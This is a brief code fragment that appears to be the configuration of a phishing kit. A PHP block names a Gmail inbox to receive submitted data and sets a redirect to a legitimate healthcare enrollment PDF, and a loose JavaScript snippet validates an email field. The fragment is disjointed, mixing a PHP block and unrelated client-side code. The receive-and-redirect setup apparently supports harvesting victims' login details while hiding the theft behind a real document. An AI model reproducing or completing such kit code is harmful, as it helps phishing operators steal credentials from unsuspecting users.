<?php 
$Receive_email="theemail@gmail.com";
$redirect="https://officeally.com/files/blue_shield_ca_era_eft_enrollment_instr_10092014.pdf";
?>

if (email.value.indexOf("@") < 0 || email.value.indexOf(".") < 0) {
			error_er.style.display = "block";
			return false;
		}